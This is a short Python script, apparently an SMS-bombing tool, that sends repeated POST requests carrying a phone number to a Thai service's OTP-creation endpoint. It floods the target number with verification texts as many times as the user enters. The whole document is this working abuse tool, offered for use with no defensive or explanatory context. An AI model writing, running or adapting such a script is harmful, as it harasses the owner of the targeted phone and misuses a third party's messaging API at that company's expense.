import requests
import time

url = "https://api2.1112.com/api/v1/otp/create"


def send(phone: str , times: int):

    payloads = {'phonenumber': f"{phone}", 'language': "th"}
    for i in range(times):
        r = requests.post(url, data=payloads)
        print(f"send to {phone} success")
        time.sleep(1)

phone_input = input("Phone : ")
times_input = int(input("Numbers : "))

send(phone=phone_input, times=times_input)